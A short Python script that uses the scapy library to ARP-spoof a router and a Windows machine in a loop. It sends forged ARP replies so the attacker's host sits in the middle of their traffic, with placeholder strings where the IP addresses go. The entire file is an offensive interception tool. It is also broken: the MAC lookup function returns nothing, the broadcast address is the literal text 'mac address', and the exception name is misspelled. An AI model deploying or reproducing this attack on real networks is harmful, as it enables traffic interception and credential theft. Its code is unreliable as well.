#!/usr/bin/python

import scapy.all as scapy


def get_target_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="mac address")
	finalpacket = broadcast/arp_request
	answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
	mac = answer[0][1].hwsrc
	return

def spoof_arp(target_ip,spoofed_ip):
	mac = get_target_mac(target_ip)
	packet = scapy.ARP(op=2,hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
	scapy.send(packet, verbose=False)

def main():
	try:
		while True:
			spoof_arp("ip adress of router","ip address of the windows")
			spoof_arp("ip address of windws","ip address of router")
	
	except keyboardInterrupt:
		exit(0)


main()